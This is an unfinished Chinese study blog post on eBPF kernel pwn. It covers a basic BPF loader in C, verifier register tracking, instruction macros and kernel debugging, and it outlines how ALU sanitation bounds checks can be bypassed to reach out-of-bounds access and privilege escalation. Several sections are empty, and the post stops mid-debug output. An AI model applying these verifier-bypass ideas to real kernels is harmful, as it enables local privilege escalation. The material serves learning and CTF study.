+++
title = '内核ebpfpwn（未完成版）'
date = 2026-02-02T12:14:05+08:00
draft = false
categories = ["pwn"]
hiddenFromHomePage=false
summary = ""

+++



<!--more-->





## 基础知识



### 常用代码

```c
//gcc ./bpf.c -o bpf
#include <stdio.h>
#include <stdlib.h>  //为了exit()函数
#include <stdint.h>    //为了uint64_t等标准类型的定义
#include <errno.h>    //为了错误处理
#include <unistd.h>
#include <linux/bpf.h>    //位于/usr/include/linux/bpf.h, 包含BPF系统调用的一些常量, 以及一些结构体的定义
#include <sys/syscall.h>    //为了syscall()

//类型转换, 减少warning, 也可以不要
#define ptr_to_u64(x) ((uint64_t)x)

//对于系统调用的包装, __NR_bpf就是bpf对应的系统调用号, 一切BPF相关操作都通过这个系统调用与内核交互
int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

//用于保存BPF验证器的输出日志
#define LOG_BUF_SIZE 0x1000
char bpf_log_buf[LOG_BUF_SIZE];

//通过系统调用, 向内核加载一段BPF指令
int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn* insns, int insn_cnt, const char* license)
{
    union bpf_attr attr = {
        .prog_type = type,        //程序类型
        .insns = ptr_to_u64(insns),    //指向指令数组的指针
        .insn_cnt = insn_cnt,    //有多少条指令
        .license = ptr_to_u64(license),    //指向整数字符串的指针
        .log_buf = ptr_to_u64(bpf_log_buf),    //log输出缓冲区
        .log_size = LOG_BUF_SIZE,    //log缓冲区大小
        .log_level = 2,    //log等级
    };

    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

//BPF程序就是一个bpf_insn数组, 一个struct bpf_insn代表一条bpf指令
struct bpf_insn bpf_prog[] = {
    { 0xb7, 0, 0, 0, 0x2 }, //初始化一个struct bpf_insn, 指令含义: mov r0, 0x2;
    { 0x95, 0, 0, 0, 0x0 }, //初始化一个struct bpf_insn, 指令含义: exit;
};

int main(void){
    //加载一个bpf程序
    int prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, bpf_prog, sizeof(bpf_prog)/sizeof(bpf_prog[0]), "GPL");
    if(prog_fd<0){
        perror("BPF load prog");
        exit(-1);
    }
    printf("prog_fd: %d\n", prog_fd);
    printf("%s\n", bpf_log_buf);    //输出程序日志
}
```



### 什么是ebpf

我们熟悉的`seccomp`就是一个被`attach`到系统调用的`bpf`程序，每次进行系统调用前都会执行这个`bpf`程序，禁掉一些系统调用

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

`ebpf`的作用不仅局限于此，它能够`attach`到内核里几乎任何地方，在内核中存取数据等等

但是，这个`bpf`程序是我们自己写的，它还会被放入内核，这是不安全的，所以我们写的`bpf`程序会通过`ebpf verifier`进行检查，才能被放入内核

其次，`bpf`程序有他的一套架构（寄存器，指令集这些），所以他要被编译(JIT compilier)成x86的汇编，才能被执行



如果`ebpf verifier`能被绕过，那我们就能把我们写的`bpf`程序`attach`到某个地方，然后执行它进行提权。这也是`ebpf pwn`学习的主要内容：绕过`ebpf verifier`的检查，进行提权。





### bpf程序架构



#### 寄存器

eBPF 虚拟机一共有 11 个 64 位寄存器，一个程序计数器（PC）与一个固定大小的堆栈（通常为 512KB），在 x86 架构下的对应关系如下：

| eBPF 寄存器 | 映射 x86_64 寄存器 |      用途      |
| :---------: | :----------------: | :------------: |
|     R0      |        rax         |   函数返回值   |
|     R1      |        rdi         |     argv1      |
|     R2      |        rsi         |     argv2      |
|     R3      |        rdx         |     argv3      |
|     R4      |        rcx         |     argv4      |
|     R5      |         r8         |     argv5      |
|     R6      |        rbx         |  callee 保存   |
|     R7      |        r13         |  callee 保存   |
|     R8      |        r14         |  callee 保存   |
|     R9      |        r15         |  callee 保存   |
| R10（只读） |        rbp         | 堆栈指针寄存器 |











### verifier

`verifier`的主要工作包括：

- 验证结构，保证循环次数，不存在死循环（早期的内核禁止循环）；清理`unreachable instructions`
- 模拟执行每一条指令，观察寄存器和栈状态的变化，确保不存越界读写等不安全行为



#### 寄存器状态跟踪



**状态类型**

`verifier`会跟踪每个寄存器的状态，给每个寄存器分配一个`struct bpf_reg_state`，每个寄存器都有类型(type)，类型可以分为以下三大类：

- 未初始化寄存器(not_init)，还没经过赋值操作，使用会导致验证失败
- 标量寄存器(scalar_value)，被赋予了整型值，能进行算数运算，不能作为指针进行内存访问
- 指针寄存器(pointer type)，该寄存器为一个指针，verifier 会检查内存访问是否超出指针允许的范围







#### 一些规则

- SCALAR 不能直接当指针用

- 允许`ptr + known_safe_offset`，`ptr + unknown_scalar`之后不能解引用（要进行边界检查才能解引用）

- ptr + ptr 禁止，`ptr - ptr`有条件允许：如果两个指针指向同一个内存对象，Verifier 允许相减来计算距离（offset）。结果会变成 `SCALAR`。但不同对象的指针相减是禁止的。

- pointer 不能做任意算术运算，Mul, Div, Mod, Shift, And, Or, Xor 对指针都是非法的。只有 Add/Sub (offset) 是合法的。

- ALU32 会 **清零高 32 位**

	未初始化的寄存器 / stack 禁止使用（程序开始时，寄存器r1已经初始化为一个指针，类型为`PTR_TO_CTX`）

- 不能把一个**内核指针**（如 `sk_buff` 的地址）直接存到 Map 里，让用户态读取。





### ALU Sanitation

在对一个指针类型寄存器进行加减某个`offset`时，一些指令会被加上去 ，验证`offset`的合法性，也就是保证这个指针的活动范围

```
BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit - 1); // -1 in old kernel versions
BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);
BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);
BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);
BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);
BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);
```

简单来说，指针类型寄存器有一个活动范围，指向栈的寄存器活动范围就在栈中，不能通过加减某个`offset`从而指到别的地方去



绕过`ALU Sanitation`分两种情况：

- 如果有一个指针指向`0x1000`，它允许最大指向`0x1500`，最小指向`0x500`。通过了某些漏洞，我们让`verifier`认为这个指针还是`0x1000`，但是它实际上是`0x500`，那么这个寄存器实际上的活动范围就是`0 - 0x1000`，能够越界读到前面的东西
- 当这个指针已经在它活动范围的边界的时候，上面的这串指令又把边界减去了1（aux->alu_limit - 1）,这就导致了无符号数的回绕，边界变成了`0xFFFFFFFF`，这样我们就能让这个指针指向很大一个范围了



> 在一些新的内核这个bug被修复了











- bpf_reg_state：维护了BPF寄存器的状态。

```c
struct bpf_reg_state {
	/* 各字段的顺序是重要的.  参见 states_equal() */
	enum bpf_reg_type type;
	/* 指针偏移的固定部分, 仅指针类型 */
	s32 off;
	union {
		/* 当 type == PTR_TO_PACKET 时可用 */
		int range;

		/* 当 type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |
		 *   PTR_TO_MAP_VALUE_OR_NULL 时可用
		 */
		struct {
			struct bpf_map *map_ptr;
			/* 为了从外部映射中区分映射查找
			 * map_uid 对于指向内部映射的寄存器为非 0 值
			 */
			u32 map_uid;
		};

		/* for PTR_TO_BTF_ID */
		struct {
			struct btf *btf;
			u32 btf_id;
		};

		struct { /* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */
			u32 mem_size;
			u32 dynptr_id; /* for dynptr slices */
		};

		/* For dynptr stack slots */
		struct {
			enum bpf_dynptr_type type;
			/* 一个 dynptr 为 16 字节， 故其占用 2 个 stack slots.
			 * 我们需要追踪哪一个 slot 为第一个防止用户可能尝试传入一个从
			 * dynptr 的第二个 slot 开始的地址的情况的 slot.
			 */
			bool first_slot;
		} dynptr;

		/* 以上任意一个的最大尺寸. */
		struct {
			unsigned long raw1;
			unsigned long raw2;
		} raw;

		u32 subprogno; /* for PTR_TO_FUNC */
	};
	/* 对于标量类型 (SCALAR_VALUE), 其表示我们对实际值的了解.
	 * 对于指针类型, 其表示从被指向对象的偏移的可变部分，
	 * 且同与我们有相同 id 的所有 bpf_reg_states 共享.
	 */
	struct tnum var_off;
	/* 被用于确定任何使用该寄存器的内存访问是否将导致一个坏的访问.
	 * These refer to the same value as var_off, not necessarily the actual
	 * contents of the register.
	 */
	s64 smin_value; /* 最小可能值 (s64) */
	s64 smax_value; /* 最大可能值 (s64) */
	u64 umin_value; /* 最小可能值 (u64) */
	u64 umax_value; /* 最大可能值 (u64) */
	s32 s32_min_value; /* 最小可能值 (s32) */
	s32 s32_max_value; /* 最大可能值 (s32) */
	u32 u32_min_value; /* 最小可能值 (u32) */
	u32 u32_max_value; /* 最大可能值 (u32) */
	/* 对于 PTR_TO_PACKET, 用以找到有着相同变量偏移的其他指针，
	 * 由此他们可以共享范围信息.
	 * 对于 PTR_TO_MAP_VALUE_OR_NULL 其被用于共享我们来自哪一个映射值
	 * 当其一被测试于 != NULL.
	 * 对于 PTR_TO_MEM_OR_NULL 其被用于辨识内存分配以追踪其释放.
	 * 对于 PTR_TO_SOCKET 其被用于共享哪一个指针保留了对 socket 的相同引用，
	 * 以确定合适的引用释放.
	 * 对于作为 dynptrs 的 stack slots, 其被用于追踪对 dynptr的引用
	 * 以确定合适的引用释放.
	 */
	u32 id;
	/* PTR_TO_SOCKET 与 PTR_TO_TCP_SOCK 可以为一个返回自一个 pointer-cast helper
	 * bpf_sk_fullsock() 与 bpf_tcp_sock() 的指针 .
	 *
	 * 考虑如下情况， "sk" 为一个返回自 "sk = bpf_sk_lookup_tcp();" 的引用计数指针:
	 *
	 * 1: sk = bpf_sk_lookup_tcp();
	 * 2: if (!sk) { return 0; }
	 * 3: fullsock = bpf_sk_fullsock(sk);
	 * 4: if (!fullsock) { bpf_sk_release(sk); return 0; }
	 * 5: tp = bpf_tcp_sock(fullsock);
	 * 6: if (!tp) { bpf_sk_release(sk); return 0; }
	 * 7: bpf_sk_release(sk);
	 * 8: snd_cwnd = tp->snd_cwnd;  // verifier 将抗议
	 *
	 * 在第 7 行的 bpf_sk_release(sk) 之后, "fullsock" 指针与
	 * "tp" 指针都应当被无效化.  为了这么做, 保存 "fullsock" 与 "sk"
	 * 的寄存器需要记住在 ref_obj_id 中的原始引用计数指针 id(即， sk_reg->id)
	 * 这样 verifier 便能重置所有 ref_obj_id 匹配 sk_reg->id 的寄存器
	 *
	 * sk_reg->ref_obj_id 在第 1 行被设为 sk_reg->id.
	 * sk_reg->id 将仅作为 NULL-marking 的目的保持.
	 * 在 NULL-marking 完成后, sk_reg->id 可以被重置为 0.
	 *
	 * 在第 3 行的 "fullsock = bpf_sk_fullsock(sk);" 之后,
	 * fullsock_reg->ref_obj_id 被设为 sk_reg->ref_obj_id.
	 *
	 * 在第 5 行的 "tp = bpf_tcp_sock(fullsock);" 之后,
	 * tp_reg->ref_obj_id 被设为 fullsock_reg->ref_obj_id
	 * 与 sk_reg->ref_obj_id 一致.
	 *
	 * 从 verifier 的角度而言, 若 sk, fullsock 与 tp 都非 NULL,
	 * 他们为有着不同 reg->type 的相同指针.
	 * 特别地, bpf_sk_release(tp) 也被允许且有着与 bpf_sk_release(sk) 
	 * 相同的影响.
	 */
	u32 ref_obj_id;
	/* 用于存活检查的亲子链 */
	struct bpf_reg_state *parent;
	/* 在被调用方中两个寄存器可以同时为 PTR_TO_STACK 如同 R1=fp-8 与 R2=fp-8,
	 * 但其一指向该函数栈而另一指向调用方的栈. 为了区分他们 'frameno' 被使用，
	 * 其为一个指向 bpf_func_state 的 bpf_verifier_state->frame[] 数组中的下标.
	 */
	u32 frameno;
	/* 追踪子寄存器（subreg）定义. 保存的值为写入 insn 的 insn_idx.
	 * 这是安全的因为 subreg_def 在任何仅在主校验结束后发生的 insn 修补前被使用.
	 */
	s32 subreg_def;
	enum bpf_reg_liveness live;
	/* if (!precise && SCALAR_VALUE) min/max/tnum don't affect safety */
	bool precise;
};
```



- bpf_reg_type

```c
/* types of values stored in eBPF registers */
/* Pointer types represent:
 * pointer
 * pointer + imm
 * pointer + (u16) var
 * pointer + (u16) var + imm
 * if (range > 0) then [ptr, ptr + range - off) is safe to access
 * if (id > 0) means that some 'var' was added
 * if (off > 0) means that 'imm' was added
 */
enum bpf_reg_type {
    NOT_INIT = 0,         /* nothing was written into register */
    SCALAR_VALUE,         /* reg doesn't contain a valid pointer */
    PTR_TO_CTX,         /* reg points to bpf_context */
    CONST_PTR_TO_MAP,     /* reg points to struct bpf_map */
    PTR_TO_MAP_VALUE,     /* reg points to map element value */
    PTR_TO_MAP_VALUE_OR_NULL,/* points to map elem value or NULL */
    PTR_TO_STACK,         /* reg == frame_pointer + offset */
    PTR_TO_PACKET_META,     /* skb->data - meta_len */
    PTR_TO_PACKET,         /* reg points to skb->data */
    PTR_TO_PACKET_END,     /* skb->data + headlen */
    PTR_TO_FLOW_KEYS,     /* reg points to bpf_flow_keys */
    PTR_TO_SOCKET,         /* reg points to struct bpf_sock */
    PTR_TO_SOCKET_OR_NULL,     /* reg points to struct bpf_sock or NULL */
    PTR_TO_SOCK_COMMON,     /* reg points to sock_common */
    PTR_TO_SOCK_COMMON_OR_NULL, /* reg points to sock_common or NULL */
    PTR_TO_TCP_SOCK,     /* reg points to struct tcp_sock */
    PTR_TO_TCP_SOCK_OR_NULL, /* reg points to struct tcp_sock or NULL */
    PTR_TO_TP_BUFFER,     /* reg points to a writable raw tp's buffer */
    PTR_TO_XDP_SOCK,     /* reg points to struct xdp_sock */
    PTR_TO_BTF_ID,         /* reg points to kernel struct */
};
```



- struct tnum

当reg是一个具体的数值（范围值），本结构代表真正的值。

当reg是一个指针，这代表了到被指向对象的偏移量。

```c
struct tnum {
    u64 value;
    u64 mask;
};
 
#define TNUM(_v, _m)    (struct tnum){.value = _v, .mask = _m}
 
/* A completely unknown value */
const struct tnum tnum_unknown = { .value = 0, .mask = -1 };
```

















### 源码



#### bpf_prog_load

当我们调用`bpf`系统调用令它的`cmd = BPF_PROG_LOAD`时，会调用到函数`bpf_prog_load`

```c
//kernel/bpf/syscall.c
SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size)
{
	union bpf_attr attr;
	......
	switch (cmd) {
	......
	case BPF_PROG_LOAD:
		err = bpf_prog_load(&attr, uattr);
		break;
	......
	}

	return err;
}
```

其中会调用到函数`bpf_check`进行`ebpf verifier`



#### bpf_check

















#### check_subprogs



















### 指令编写



在内核源码目录中定义了`samples/bpf/bpf_insn.h`，可以使用其中的宏指令来编写，比起直接用常数写，简化了很多

使用的时候，`include`进去即可。（这里加了个`BPF_CALL_FUNC`）

```c
/* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */
/* eBPF instruction mini library */
#ifndef __BPF_INSN_H
#define __BPF_INSN_H

struct bpf_insn;

/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */

#define BPF_ALU64_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_ALU32_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */

#define BPF_ALU64_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_ALU32_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

/* Short form of mov, dst_reg = src_reg */

#define BPF_MOV64_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV32_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

/* Short form of mov, dst_reg = imm32 */

#define BPF_MOV64_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_MOV32_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

/* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */
#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_LD | BPF_DW | BPF_IMM,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = (__u32) (IMM) }),			\
	((struct bpf_insn) {					\
		.code  = 0, /* zero is reserved opcode */	\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = ((__u64) (IMM)) >> 32 })

#ifndef BPF_PSEUDO_MAP_FD
# define BPF_PSEUDO_MAP_FD	1
#endif

/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */
#define BPF_LD_MAP_FD(DST, MAP_FD)				\
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)


/* Direct packet access, R0 = *(uint *) (skb->data + imm32) */

#define BPF_LD_ABS(SIZE, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS,	\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

/* Memory load, dst_reg = *(uint *) (src_reg + off16) */

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Memory store, *(uint *) (dst_reg + off16) = src_reg */

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/*
 * Atomic operations:
 *
 *   BPF_ADD                  *(uint *) (dst_reg + off16) += src_reg
 *   BPF_AND                  *(uint *) (dst_reg + off16) &= src_reg
 *   BPF_OR                   *(uint *) (dst_reg + off16) |= src_reg
 *   BPF_XOR                  *(uint *) (dst_reg + off16) ^= src_reg
 *   BPF_ADD | BPF_FETCH      src_reg = atomic_fetch_add(dst_reg + off16, src_reg);
 *   BPF_AND | BPF_FETCH      src_reg = atomic_fetch_and(dst_reg + off16, src_reg);
 *   BPF_OR | BPF_FETCH       src_reg = atomic_fetch_or(dst_reg + off16, src_reg);
 *   BPF_XOR | BPF_FETCH      src_reg = atomic_fetch_xor(dst_reg + off16, src_reg);
 *   BPF_XCHG                 src_reg = atomic_xchg(dst_reg + off16, src_reg)
 *   BPF_CMPXCHG              r0 = atomic_cmpxchg(dst_reg + off16, r0, src_reg)
 */

#define BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = OP })

/* Legacy alias */
#define BPF_STX_XADD(SIZE, DST, SRC, OFF) BPF_ATOMIC_OP(SIZE, BPF_ADD, DST, SRC, OFF)

/* Memory store, *(uint *) (dst_reg + off16) = imm32 */

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Conditional jumps against registers, if (dst_reg 'op' src_reg) goto pc + off16 */

#define BPF_JMP_REG(OP, DST, SRC, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Like BPF_JMP_REG, but with 32-bit wide operands for comparison. */

#define BPF_JMP32_REG(OP, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Conditional jumps against immediates, if (dst_reg 'op' imm32) goto pc + off16 */

#define BPF_JMP_IMM(OP, DST, IMM, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_CALL_FUNC(FUNC) \
	((struct bpf_insn) {                                    \
		.code = BPF_JMP | BPF_CALL | BPF_K,				\
		.dst_reg = 0,	\
		.src_reg = 0,	\
		.off = 0, \
		.imm = FUNC })
		
/* Raw code statement block */

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)			\
	((struct bpf_insn) {					\
		.code  = CODE,					\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Program exit */

#define BPF_EXIT_INSN()						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_EXIT,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = 0 })

#endif
```







#### ALU类

| **宏名称**                    | **逻辑**                | **说明**           | **代码示例**                                   |
| ----------------------------- | ----------------------- | ------------------ | ---------------------------------------------- |
| `BPF_ALU64_REG(OP, DST, SRC)` | `dst = dst OP src`      | 64位寄存器间运算   | `BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2)` |
| `BPF_ALU32_REG(OP, DST, SRC)` | `(u32)dst = dst OP src` | 32位寄存器间运算   | `BPF_ALU32_REG(BPF_SUB, BPF_REG_1, BPF_REG_2)` |
| `BPF_ALU64_IMM(OP, DST, IMM)` | `dst = dst OP imm`      | 64位寄存器与立即数 | `BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 8)`         |
| `BPF_ALU32_IMM(OP, DST, IMM)` | `(u32)dst = dst OP imm` | 32位寄存器与立即数 | `BPF_ALU32_IMM(BPF_XOR, BPF_REG_1, 0xFF)`      |

> **常见 OP**： `BPF_ADD / SUB / MUL / DIV / AND / OR / XOR / LSH / RSH / ARSH`
>
> ALU32 一定会清零 dst 的高 32 位



#### 赋值类

| **宏名称**                | **逻辑**           | **说明**             | **代码示例**                          |
| ------------------------- | ------------------ | -------------------- | ------------------------------------- |
| `BPF_MOV64_REG(DST, SRC)` | `dst = src`        | 64位寄存器拷贝       | `BPF_MOV64_REG(BPF_REG_1, BPF_REG_0)` |
| `BPF_MOV32_REG(DST, SRC)` | `(u32)dst = src`   | 32位寄存器拷贝       | `BPF_MOV32_REG(BPF_REG_1, BPF_REG_0)` |
| `BPF_MOV64_IMM(DST, IMM)` | `dst = imm32`      | 立即数存入64位寄存器 | `BPF_MOV64_IMM(BPF_REG_1, 0x1337)`    |
| `BPF_MOV32_IMM(DST, IMM)` | `(u32)dst = imm32` | 立即数存入32位寄存器 | `BPF_MOV32_IMM(BPF_REG_1, 1)`         |





#### 内存读写类

| **宏名称**                         | **逻辑**                   | **说明**                  | **代码示例**                                   |
| ---------------------------------- | -------------------------- | ------------------------- | ---------------------------------------------- |
| `BPF_LDX_MEM(SIZE, DST, SRC, OFF)` | `dst = *(size *)(src+off)` | **Load**: 内存 -> 寄存器  | `BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0)` |
| `BPF_STX_MEM(SIZE, DST, SRC, OFF)` | `*(size *)(dst+off) = src` | **Store**: 寄存器 -> 内存 | `BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 8)` |
| `BPF_ST_MEM(SIZE, DST, OFF, IMM)`  | `*(size *)(dst+off) = imm` | **Store**: 立即数 -> 内存 | `BPF_ST_MEM(BPF_W, BPF_REG_1, 0, 0xDEAD)`      |
| `BPF_LD_IMM64(DST, IMM)`           | `dst = imm64`              | 加载 64 位超长立即数      | `BPF_LD_IMM64(BPF_REG_1, 0xFFFF888812345678)`  |
| `BPF_LD_MAP_FD(DST, MAP_FD)`       | `dst = map_ptr`            | 将 Map 的 FD 转为内存地址 | `BPF_LD_MAP_FD(BPF_REG_1, map_fd)`             |





#### 跳转指令

| **宏名称**                       | **逻辑**                    | **说明**             | **代码示例**                                    |
| -------------------------------- | --------------------------- | -------------------- | ----------------------------------------------- |
| `BPF_JMP_REG(OP, DST, SRC, OFF)` | `if (dst OP src) PC += off` | 寄存器间比较跳转     | `BPF_JMP_REG(BPF_JEQ, BPF_REG_0, BPF_REG_1, 2)` |
| `BPF_JMP_IMM(OP, DST, IMM, OFF)` | `if (dst OP imm) PC += off` | 寄存器与常数比较跳转 | `BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 5)`         |
| `BPF_CALL_FUNC(FUNC)`            | `r0 = FUNC(...)`            | 调用内核辅助函数     | `BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem)`       |





#### 其他指令

| **宏名称**                        | **逻辑**     | **说明**                 | **代码示例**                                    |
| --------------------------------- | ------------ | ------------------------ | ----------------------------------------------- |
| `BPF_EXIT_INSN()`                 | `return r0`  | 结束程序                 | `BPF_EXIT_INSN()`                               |
| `BPF_RAW_INSN(CODE, D, S, O, I)`  | `(manual)`   | 手动填充原生指令所有字段 | `BPF_RAW_INSN(0x07, 1, 0, 0, 0x12)`             |
| `BPF_STX_XADD(SZ, DST, SRC, OFF)` | `atomic_add` | 原子加法                 | `BPF_STX_XADD(BPF_DW, BPF_REG_1, BPF_REG_0, 0)` |







### proc接口

- `/proc/sys/net/core/bpf_jit_enable` 可以检查 bpf 能不能被 JIT
	- Values:
		- 0 - disable the JIT (default value)
		- 1 - enable the JIT
		- 2 - enable the JIT and ask the compiler to emit traces on kernel log.

- `/proc/sys/kernel/unprivileged_bpf_disabled` 可以检查是否能执行
	- Values:
		- 0 - Unprivileged calls to `bpf()` are enabled
		- 1 - Unprivileged calls to `bpf()` are disabled without recovery
		- 2 - Unprivileged calls to `bpf()` are disabled





### 调试

#### 查结构体

在分配一个`array`类型的`map`的时候（`ebpf pwn`中我们通常都使用`type`为`array`的`map`），会调用函数`array_map_alloc`（路径：`/kernel/bpf/arraymap.c`）分配`struct bpf_array`这个函数：

- 调用函数` bpf_map_area_alloc`，分配`struct bpf_array`
- 返回`&array->map`，也就是返回`bpf_array`的`struct bpf_map`，`array`的首地址

```asm
   0xffffffff9b5d4d37 <array_map_alloc+151>:    mov    BYTE PTR [rbp-0x2d],r8b
   0xffffffff9b5d4d3b <array_map_alloc+155>:    call   0xffffffff9b595030 <bpf_map_area_alloc>
   0xffffffff9b5d4d40 <array_map_alloc+160>:    movzx  r8d,BYTE PTR [rbp-0x2d]
```



`fin`这个函数后还没有分配`struct bpf_map`中的`ops`，会在这个函数的上层函数`__do_sys_bpf`中设置`ops`字段

> ops只有一个，不同的bpf_map都指向同一个ops



调试命令：

```
b array_map_alloc
c
fin
set $array1 = $rax
```





#### 实际执行bpf程序

> 这里的内核版本是6.12.47

断在`sk_filter_trim_cap`中，

```asm
   0xffffffffb3da8d37 <sk_filter_trim_cap+151>: mov    rdi,rbx
   0xffffffffb3da8d3a <sk_filter_trim_cap+154>: call   0xffffffffb3f6a940 <__x86_indirect_thunk_rax>
   0xffffffffb3da8d3f <sk_filter_trim_cap+159>: mov    r15d,eax
```

当程序停在 `0xffffffffb3da8d3a` 时，这个指令就是`call rax`。此时 `RAX` 寄存器里存的就是 eBPF 程序 JIT 编译后的入口地址。

```
pwndbg> p/x $rip
$8 = 0xffffffffb3da8d3a
pwndbg> i r rax
rax            0xffffffffc022566c  -1071491476
pwndbg> vmmap 0xffffffffc022566c
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
